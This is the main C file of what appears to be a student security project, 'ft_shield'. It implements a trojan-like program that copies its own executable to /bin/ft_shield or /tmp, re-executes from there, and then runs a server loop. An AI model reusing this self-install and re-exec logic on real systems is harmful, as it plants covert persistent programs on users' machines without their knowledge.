/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/16 18:15:16 by mbatty            #+#    #+#             */
/*   Updated: 2025/12/02 12:27:53 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ctx.h"

int	g_sig = 0;

void	handle_sig(int sig)
{
	g_sig = sig;
}

int	ctx_loop(t_ctx *ctx)
{
	while (g_sig == 0 && ctx->running)
		server_update(&ctx->server);
	if (g_sig != 0)
		logger_log(ctx, LOG_INFO, "Received a signal");
	return (1);
}

static void	handle_payload(bool root, char **envp)
{
	char	*payload_path;
	char	exec_path[4096] = {0};
	
	if (root)
		payload_path = "/bin/ft_shield";
	else
		payload_path = "/tmp/binft_shield";

	readlink("/proc/self/exe", exec_path, sizeof(exec_path));

	if (strcmp(exec_path, payload_path)) // Not executed as payload, need to export it
	{
		export_payload(root, exec_path, payload_path);
		exec_payload(payload_path, envp);
	}
}

int	main(int ac, char **av, char **envp)
{
	(void)ac;(void)av;
	t_ctx	ctx;	

	memset(&ctx, 0, sizeof(t_ctx));
	ctx.is_root = getuid() == 0;

	handle_payload(ctx.is_root, envp);

	if (!ctx_init(&ctx))
		return (0);
	ctx_loop(&ctx);
	return (ctx_delete(&ctx, true));
}
